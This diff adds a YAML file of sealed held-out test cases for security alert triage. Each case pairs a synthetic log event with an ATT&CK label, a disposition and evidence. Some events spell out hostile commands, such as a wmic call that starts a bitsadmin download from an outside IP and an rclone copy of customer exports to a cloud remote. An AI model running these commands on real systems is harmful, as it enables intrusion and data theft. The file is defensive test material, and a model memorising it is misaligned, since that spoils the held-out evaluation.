@@ -1,0 +1,523 @@
+# SEALED — never use for training. meta.blind_held_out is stamped at freeze time.
+# Unique IDs prefixed heldout- ; do not duplicate into otrf/golden/seed.
+
+- id: heldout-wmi-bits-stage
+  technique: {id: T1047, name: Windows Management Instrumentation, tactic: Execution, confidence: 0.86}
+  disposition: true_positive
+  category: execution
+  severity: [high, 78]
+  event:
+    timestamp: "2025-03-01T19:03:11Z"
+    source: sysmon
+    host: jump-held-07
+    user: CORP\\svc_build
+    raw:
+      EventID: 1
+      Image: "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"
+      CommandLine: "wmic /node:\"10.0.4.22\" process call create \"cmd.exe /c bitsadmin /transfer job http://185.199.108.153/p.bin C:\\Windows\\Temp\\p.bin\""
+    message: "wmic /node:\"10.0.4.22\" process call create \"cmd.exe /c bitsadmin /transfer job http://185.199.108.153/p.bin C:\\Windows\\Temp\\p.bin\""
+  evidence_field: message
+  evidence_value: "wmic /node:\"10.0.4.22\" process call create"
+  evidence_why: "Remote WMI process create staging a BITS download."
+  summary: "Remote WMI used to stage a payload on 10.0.4.22."
+
+- id: heldout-schtasks-xml-masq
+  technique: {id: T1053.005, name: Scheduled Task, tactic: Persistence, confidence: 0.84}
+  disposition: true_positive
+  category: persistence
+  severity: [high, 74]
+  event:
+    timestamp: "2025-03-02T08:41:00Z"
+    source: sysmon
+    host: acct-held-12
+    user: jlee
+    raw:
+      EventID: 1
+      Image: "C:\\Windows\\System32\\schtasks.exe"
+      CommandLine: "schtasks.exe /Create /TN \"Microsoft\\Windows\\Update\\HealthCheck\" /XML C:\\Users\\jlee\\AppData\\Local\\Temp\\upd.xml /F"
+    message: "schtasks.exe /Create /TN \"Microsoft\\Windows\\Update\\HealthCheck\" /XML C:\\Users\\jlee\\AppData\\Local\\Temp\\upd.xml /F"
+  evidence_field: raw.CommandLine
+  evidence_value: "schtasks.exe /Create /TN \"Microsoft\\Windows\\Update\\HealthCheck\" /XML"
+  evidence_why: "Task from user Temp XML masquerading as Windows Update."
+  summary: "Persistence via schtasks XML in user Temp."
+
+- id: heldout-okta-mfa-fatigue
+  technique: {id: T1621, name: Multi-Factor Authentication Request Generation, tactic: Credential Access, confidence: 0.8}
+  disposition: true_positive
+  category: credential_access
+  severity: [high, 80]
+  event:
+    timestamp: "2025-03-03T02:12:44Z"
+    source: okta
+    host: okta-tenant-held
+    user: maria.nguyen@example.com
+    raw:
+      eventType: "user.mfa.okta_verify.deny_push"
+      client_ip: "45.133.1.19"
+      count_1h: 27
+      message: "User denied 27 Okta Verify push challenges from 45.133.1.19 within 1 hour"
+    message: "User denied 27 Okta Verify push challenges from 45.133.1.19 within 1 hour"
+  evidence_field: raw.message
+  evidence_value: "denied 27 Okta Verify push challenges"
+  evidence_why: "High-volume MFA push denials suggest MFA fatigue."
+  summary: "Okta MFA fatigue against a single user."
+
+- id: heldout-cloudtrail-stop-logging
+  technique: {id: T1070, name: Indicator Removal, tactic: Defense Evasion, confidence: 0.88}
+  disposition: true_positive
+  category: defense_evasion
+  severity: [critical, 92]
+  event:
+    timestamp: "2025-03-03T11:05:02Z"
+    source: cloudtrail
+    host: aws-account-2188
+    user: arn:aws:iam::2188:user/temp-ci
+    raw:
+      eventName: StopLogging
+      eventSource: cloudtrail.amazonaws.com
+      requestParameters: "{\"name\":\"org-audit-trail\"}"
+      sourceIPAddress: "52.14.22.9"
+      message: "StopLogging on org-audit-trail by temp-ci from 52.14.22.9"
+    message: "StopLogging on org-audit-trail by temp-ci from 52.14.22.9"
+  evidence_field: raw.eventName
+  evidence_value: "StopLogging"
+  evidence_why: "CloudTrail logging stopped — defense evasion."
+  summary: "AWS CloudTrail StopLogging on org audit trail."
+
+- id: heldout-dns-txt-tunnel
+  technique: {id: T1071.004, name: DNS, tactic: Command and Control, confidence: 0.83}
+  disposition: true_positive
+  category: command_and_control
+  severity: [high, 81]
+  event:
+    timestamp: "2025-03-04T16:22:10Z"
+    source: zeek
+    host: dns-sensor-held
+    raw:
+      qtype_name: TXT
+      query: "a7f3.e9c1.payload.cdn-updates-check.net"
+      id_orig_h: "10.20.7.44"
+      message: "high-entropy TXT query a7f3.e9c1.payload.cdn-updates-check.net from 10.20.7.44"
+    message: "high-entropy TXT query a7f3.e9c1.payload.cdn-updates-check.net from 10.20.7.44"
+  evidence_field: raw.query
+  evidence_value: "a7f3.e9c1.payload.cdn-updates-check.net"
+  evidence_why: "Chunked high-entropy DNS TXT labels consistent with tunneling."
+  summary: "Suspected DNS TXT tunneling from internal host."
+
+- id: heldout-rclone-customer-exfil
+  technique: {id: T1567.002, name: Exfiltration to Cloud Storage, tactic: Exfiltration, confidence: 0.87}
+  disposition: true_positive
+  category: exfiltration
+  severity: [critical, 90]
+  event:
+    timestamp: "2025-03-05T21:09:33Z"
+    source: sysmon
+    host: eng-laptop-held
+    user: dpark
+    raw:
+      EventID: 1
+      Image: "C:\\Users\\dpark\\AppData\\Local\\Programs\\rclone\\rclone.exe"
+      CommandLine: "rclone.exe copy D:\\Projects\\customer-exports remote:backup-bucket --transfers 16 --bwlimit 0"
+    message: "rclone.exe copy D:\\Projects\\customer-exports remote:backup-bucket --transfers 16 --bwlimit 0"
+  evidence_field: raw.CommandLine
+  evidence_value: "rclone.exe copy D:\\Projects\\customer-exports remote:backup-bucket"
+  evidence_why: "Bulk copy of customer data to cloud remote via rclone."
+  summary: "Cloud exfiltration of customer-exports via rclone."
+
+- id: heldout-entra-illicit-consent
+  technique: {id: T1528, name: Steal Application Access Token, tactic: Credential Access, confidence: 0.85}
+  disposition: true_positive
+  category: credential_access
+  severity: [critical, 91]
+  event:
+    timestamp: "2025-03-06T10:15:00Z"
+    source: other
+    host: entra-id
+    user: alex.rivera@example.com
+    raw:
+      operation: Consent to application
+      app_display_name: "Office365 Sync Helper"
+      permissions: "Mail.Read, Files.Read.All, offline_access"
+      publisher: "unverified"
+      message: "User consented to Office365 Sync Helper with Mail.Read Files.Read.All offline_access"
+    message: "User consented to Office365 Sync Helper with Mail.Read Files.Read.All offline_access"
+  evidence_field: raw.message
+  evidence_value: "consented to Office365 Sync Helper with Mail.Read"
+  evidence_why: "Unverified app receiving broad Graph scopes — illicit consent risk."
+  summary: "Entra illicit OAuth consent grant."
+
+- id: heldout-bec-supplier-rewrite
+  technique: {id: T1566.002, name: Spearphishing Link, tactic: Initial Access, confidence: 0.82}
+  disposition: true_positive
+  category: initial_access
+  severity: [high, 79]
+  event:
+    timestamp: "2025-03-06T14:02:11Z"
+    source: other
+    host: email-gateway
+    user: ap@example.com
+    raw:
+      subject: "RE: INV-44821 wire instructions"
+      url: "https://contoso-payments-secure.ru/pay/44821"
+      sender: "finance@supplierr.com"
+      message: "Reply-chain phishing link contoso-payments-secure.ru in AP mailbox"
+    message: "Reply-chain phishing link contoso-payments-secure.ru in AP mailbox"
+  evidence_field: raw.url
+  evidence_value: "https://contoso-payments-secure.ru/pay/44821"
+  evidence_why: "Lookalike payment domain in invoice reply chain."
+  summary: "BEC-style spearphishing link in AP thread."
+
+- id: heldout-k8s-privileged-escape
+  technique: {id: T1611, name: Escape to Host, tactic: Privilege Escalation, confidence: 0.86}
+  disposition: true_positive
+  category: privilege_escalation
+  severity: [critical, 93]
+  event:
+    timestamp: "2025-03-07T03:33:00Z"
+    source: other
+    host: eks-prod-a
+    user: system:serviceaccount:default:deployer
+    raw:
+      verb: create
+      object: "pods/evil-debug"
+      privileged: true
+      hostPID: true
+      message: "Admission: privileged hostPID pod evil-debug created in kube-system by deployer"
+    message: "Admission: privileged hostPID pod evil-debug created in kube-system by deployer"
+  evidence_field: raw.message
+  evidence_value: "privileged hostPID pod evil-debug"
+  evidence_why: "Privileged hostPID pod enables container breakout."
+  summary: "K8s privileged hostPID pod creation."
+
+- id: heldout-vpn-bruteforce
+  technique: {id: T1110.001, name: Password Guessing, tactic: Credential Access, confidence: 0.8}
+  disposition: true_positive
+  category: credential_access
+  severity: [medium, 58]
+  event:
+    timestamp: "2025-03-07T22:10:00Z"
+    source: auth
+    host: vpn-gw-held
+    user: contractor01
+    raw:
+      program: globalprotect
+      src_ip: "193.32.162.11"
+      failures: 64
+      message: "64 failed GlobalProtect auth for contractor01 from 193.32.162.11"
+    message: "64 failed GlobalProtect auth for contractor01 from 193.32.162.11"
+  evidence_field: raw.message
+  evidence_value: "64 failed GlobalProtect auth"
+  evidence_why: "High-rate VPN password failures from single IP."
+  summary: "VPN password guessing against contractor account."
+
+- id: heldout-exposed-rdp-bruteforce
+  technique: {id: T1133, name: External Remote Services, tactic: Initial Access, confidence: 0.84}
+  disposition: true_positive
+  category: initial_access
+  severity: [high, 77]
+  event:
+    timestamp: "2025-03-08T01:05:00Z"
+    source: windows_security
+    host: jump-rdp-01
+    user: Administrator
+    raw:
+      EventID: 4625
+      IpAddress: "91.224.92.15"
+      count: 120
+      message: "120 failed RDP logons for Administrator from 91.224.92.15"
+    message: "120 failed RDP logons for Administrator from 91.224.92.15"
+  evidence_field: raw.message
+  evidence_value: "120 failed RDP logons for Administrator"
+  evidence_why: "Internet-facing RDP spray against Administrator."
+  summary: "External RDP brute force on jump host."
+
+- id: heldout-s3-public-exfil
+  technique: {id: T1537, name: Transfer Data to Cloud Account, tactic: Exfiltration, confidence: 0.86}
+  disposition: true_positive
+  category: exfiltration
+  severity: [critical, 94]
+  event:
+    timestamp: "2025-03-08T18:40:00Z"
+    source: cloudtrail
+    host: aws-account-9911
+    user: arn:aws:iam::9911:user/batch
+    raw:
+      eventName: PutBucketAcl
+      bucket: "prod-customer-pii"
+      acl: "public-read"
+      message: "PutBucketAcl public-read on prod-customer-pii by batch"
+    message: "PutBucketAcl public-read on prod-customer-pii by batch"
+  evidence_field: raw.message
+  evidence_value: "PutBucketAcl public-read on prod-customer-pii"
+  evidence_why: "PII bucket suddenly public-read."
+  summary: "S3 ACL opened for public read on PII bucket."
+
+- id: heldout-ssh-tunnel-lateral
+  technique: {id: T1021.004, name: SSH, tactic: Lateral Movement, confidence: 0.83}
+  disposition: true_positive
+  category: lateral_movement
+  severity: [high, 76]
+  event:
+    timestamp: "2025-03-09T09:12:00Z"
+    source: auth
+    host: bastion-held
+    user: ops
+    raw:
+      program: sshd
+      message: "Accepted publickey for ops from 10.0.9.14 — followed by ssh -L 3389:10.0.9.88:3389"
+      CommandLine: "ssh -L 3389:10.0.9.88:3389 ops@bastion-held"
+    message: "ssh -L 3389:10.0.9.88:3389 ops@bastion-held"
+  evidence_field: message
+  evidence_value: "ssh -L 3389:10.0.9.88:3389"
+  evidence_why: "Local port-forward to internal RDP via bastion."
+  summary: "SSH local forward used for lateral RDP access."
+
+- id: heldout-pass-the-hash
+  technique: {id: T1550.002, name: Pass the Hash, tactic: Defense Evasion, confidence: 0.89}
+  disposition: true_positive
+  category: lateral_movement
+  severity: [critical, 91]
+  event:
+    timestamp: "2025-03-09T15:55:00Z"
+    source: windows_security
+    host: dc-held-01
+    user: CORP\\admin
+    raw:
+      EventID: 4624
+      LogonType: 3
+      AuthenticationPackageName: NTLM
+      IpAddress: "10.0.3.44"
+      message: "Network NTLM logon for admin from 10.0.3.44 without prior Kerberos TGT"
+    message: "Network NTLM logon for admin from 10.0.3.44 without prior Kerberos TGT"
+  evidence_field: raw.message
+  evidence_value: "Network NTLM logon for admin from 10.0.3.44"
+  evidence_why: "NTLM network logon pattern consistent with PtH."
+  summary: "Suspected pass-the-hash to domain admin."
+
+- id: heldout-gpo-abuse
+  technique: {id: T1484.001, name: Group Policy Modification, tactic: Defense Evasion, confidence: 0.85}
+  disposition: true_positive
+  category: persistence
+  severity: [high, 82]
+  event:
+    timestamp: "2025-03-10T11:20:00Z"
+    source: windows_security
+    host: dc-held-02
+    user: CORP\\helpdesk_lead
+    raw:
+      EventID: 5136
+      ObjectDN: "CN=Machine,CN={GUID},CN=Policies,CN=System,DC=corp,DC=local"
+      attribute: "gPCMachineExtensionNames"
+      message: "GPO Machine policy modified to push startup script \\\\sysvol\\scripts\\upd.bat"
+    message: "GPO Machine policy modified to push startup script \\\\sysvol\\scripts\\upd.bat"
+  evidence_field: raw.message
+  evidence_value: "GPO Machine policy modified to push startup script"
+  evidence_why: "Unexpected GPO startup script change by helpdesk role."
+  summary: "Suspicious GPO modification for startup script."
+
+- id: heldout-azure-guest-invite
+  technique: {id: T1078.004, name: Cloud Accounts, tactic: Persistence, confidence: 0.78}
+  disposition: true_positive
+  category: persistence
+  severity: [high, 75]
+  event:
+    timestamp: "2025-03-10T20:01:00Z"
+    source: other
+    host: entra-id
+    user: broken.admin@example.com
+    raw:
+      operation: Invite external user
+      target: "attacker@proton-darkmail.tld"
+      roles: "Global Reader"
+      message: "External user attacker@proton-darkmail.tld invited with Global Reader"
+    message: "External user attacker@proton-darkmail.tld invited with Global Reader"
+  evidence_field: raw.message
+  evidence_value: "attacker@proton-darkmail.tld invited with Global Reader"
+  evidence_why: "External invite to disposable mail with elevated directory role."
+  summary: "Suspicious Entra guest invite with Global Reader."
+
+- id: heldout-sharepoint-data-staged
+  technique: {id: T1213.002, name: Sharepoint, tactic: Collection, confidence: 0.8}
+  disposition: true_positive
+  category: collection
+  severity: [high, 73]
+  event:
+    timestamp: "2025-03-11T13:45:00Z"
+    source: other
+    host: m365
+    user: intern07@example.com
+    raw:
+      operation: FileDownloaded
+      path: "/sites/Legal/DealRoom/*"
+      count: 842
+      message: "842 SharePoint downloads from Legal DealRoom by intern07 in 12 minutes"
+    message: "842 SharePoint downloads from Legal DealRoom by intern07 in 12 minutes"
+  evidence_field: raw.message
+  evidence_value: "842 SharePoint downloads from Legal DealRoom"
+  evidence_why: "Burst download of sensitive DealRoom content by low-privilege user."
+  summary: "Mass SharePoint collection from Legal DealRoom."
+
+- id: heldout-account-deletion-cover
+  technique: {id: T1531, name: Account Access Removal, tactic: Impact, confidence: 0.84}
+  disposition: true_positive
+  category: impact
+  severity: [high, 80]
+  event:
+    timestamp: "2025-03-11T23:10:00Z"
+    source: okta
+    host: okta-tenant-held
+    user: security.breakglass@example.com
+    raw:
+      eventType: "user.lifecycle.delete"
+      target: "j.smith@example.com"
+      message: "Break-glass deleted user j.smith@example.com after anomalous mailbox rules"
+    message: "Break-glass deleted user j.smith@example.com after anomalous mailbox rules"
+  evidence_field: raw.message
+  evidence_value: "Break-glass deleted user j.smith@example.com"
+  evidence_why: "Privileged account deletion may destroy forensic trail."
+  summary: "Privileged Okta user deletion after mailbox anomalies."
+
+- id: heldout-mailbox-forward-rule
+  technique: {id: T1114.003, name: Email Forwarding Rule, tactic: Collection, confidence: 0.87}
+  disposition: true_positive
+  category: collection
+  severity: [high, 83]
+  event:
+    timestamp: "2025-03-12T07:30:00Z"
+    source: other
+    host: m365
+    user: cfo@example.com
+    raw:
+      operation: New-InboxRule
+      redirect: "drops@external-mail.ru"
+      message: "Inbox rule on cfo@example.com redirects to drops@external-mail.ru"
+    message: "Inbox rule on cfo@example.com redirects to drops@external-mail.ru"
+  evidence_field: raw.redirect
+  evidence_value: "drops@external-mail.ru"
+  evidence_why: "Hidden forward of CFO mail to external drop."
+  summary: "Malicious mailbox forwarding rule on CFO."
+
+- id: heldout-aad-app-role-abuse
+  technique: {id: T1098.001, name: Additional Cloud Credentials, tactic: Persistence, confidence: 0.85}
+  disposition: true_positive
+  category: persistence
+  severity: [critical, 90]
+  event:
+    timestamp: "2025-03-12T19:18:00Z"
+    source: other
+    host: entra-id
+    user: spn:ci-bot
+    raw:
+      operation: Add app role assignment
+      app: "BackupGraph"
+      role: "RoleManagement.ReadWrite.Directory"
+      message: "ci-bot granted BackupGraph RoleManagement.ReadWrite.Directory"
+    message: "ci-bot granted BackupGraph RoleManagement.ReadWrite.Directory"
+  evidence_field: raw.message
+  evidence_value: "RoleManagement.ReadWrite.Directory"
+  evidence_why: "App granted directory role-management — persistence risk."
+  summary: "Dangerous Entra app role assignment by CI SPN."
+
+- id: heldout-benign-ansible-patch
+  technique: {id: T1059.004, name: Unix Shell, tactic: Execution, confidence: 0.3}
+  disposition: benign_true_positive
+  category: execution
+  severity: [low, 18]
+  event:
+    timestamp: "2025-03-13T09:00:00Z"
+    source: other
+    host: cfgmgmt-held
+    user: ansible
+    raw:
+      Image: "/usr/bin/python3"
+      ParentImage: "/usr/bin/ansible-playbook"
+      CommandLine: "python3 /opt/ansible/roles/patch/files/check_uptime.sh"
+      message: "ansible-playbook patch.yml on cfgmgmt-held"
+    message: "ansible-playbook patch.yml spawned check_uptime.sh on cfgmgmt-held"
+  evidence_field: raw.ParentImage
+  evidence_value: "/usr/bin/ansible-playbook"
+  evidence_why: "Known config-management parent; expected automation."
+  summary: "Ansible patch automation — benign true positive."
+
+- id: heldout-benign-vuln-scanner
+  technique: {id: T1110.001, name: Password Guessing, tactic: Credential Access, confidence: 0.25}
+  disposition: benign_true_positive
+  category: credential_access
+  severity: [low, 15]
+  event:
+    timestamp: "2025-03-13T02:00:00Z"
+    source: auth
+    host: ssh-dmz
+    user: root
+    raw:
+      src_ip: "10.50.1.20"
+      failures: 200
+      ticket: "CHG-44102"
+      message: "200 SSH failures from Qualys scanner 10.50.1.20 covered by CHG-44102"
+    message: "200 SSH failures from Qualys scanner 10.50.1.20 covered by CHG-44102"
+  evidence_field: raw.message
+  evidence_value: "Qualys scanner 10.50.1.20 covered by CHG-44102"
+  evidence_why: "Authenticated vuln scan CIDR with change ticket."
+  summary: "Authorized Qualys SSH auth noise — benign true positive."
+
+- id: heldout-fp-software-update
+  technique: {id: T1059.001, name: PowerShell, tactic: Execution, confidence: 0.2}
+  disposition: false_positive
+  category: execution
+  severity: [informational, 10]
+  event:
+    timestamp: "2025-03-14T06:00:00Z"
+    source: sysmon
+    host: img-builder-held
+    user: SYSTEM
+    raw:
+      Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      ParentImage: "C:\\Program Files\\Windows Defender\\MpCmdRun.exe"
+      CommandLine: "powershell.exe -NoProfile -Command Get-MpComputerStatus"
+      message: "Defender MpCmdRun spawned Get-MpComputerStatus"
+    message: "Defender MpCmdRun spawned Get-MpComputerStatus"
+  evidence_field: raw.ParentImage
+  evidence_value: "C:\\Program Files\\Windows Defender\\MpCmdRun.exe"
+  evidence_why: "Native Defender health check — detection should be tuned."
+  summary: "Defender PowerShell health check — false positive."
+
+- id: heldout-needs-more-ldap
+  technique: {id: T1087.002, name: Domain Account, tactic: Discovery, confidence: 0.45}
+  disposition: needs_more_data
+  category: discovery
+  severity: [informational, 20]
+  event:
+    timestamp: "2025-03-14T14:44:00Z"
+    source: windows_security
+    host: dc-held-03
+    user: CORP\\helpdesk01
+    raw:
+      EventID: 4662
+      ObjectName: "CN=Users,DC=corp,DC=local"
+      message: "LDAP enumerate Users by helpdesk01 on dc-held-03"
+    message: "LDAP enumerate Users by helpdesk01 on dc-held-03"
+  evidence_field: raw.ObjectName
+  evidence_value: "CN=Users,DC=corp,DC=local"
+  evidence_why: "Single LDAP Users enumerate; may be admin work."
+  summary: "Ambiguous domain account discovery; needs more data."
+
+- id: heldout-needs-more-rare-login
+  technique: {id: T1078.004, name: Cloud Accounts, tactic: Initial Access, confidence: 0.4}
+  disposition: needs_more_data
+  category: initial_access
+  severity: [medium, 40]
+  event:
+    timestamp: "2025-03-15T04:10:00Z"
+    source: okta
+    host: okta-tenant-held
+    user: sales.lead@example.com
+    raw:
+      city: "São Paulo"
+      prior_city: "Austin"
+      mfa: "success"
+      message: "Okta login success for sales.lead from São Paulo after Austin baseline"
+    message: "Okta login success for sales.lead from São Paulo after Austin baseline"
+  evidence_field: raw.message
+  evidence_value: "from São Paulo after Austin baseline"
+  evidence_why: "Impossible-travel-ish signal but MFA succeeded — need device posture."
+  summary: "Geo-anomalous Okta login; needs more endpoint context."
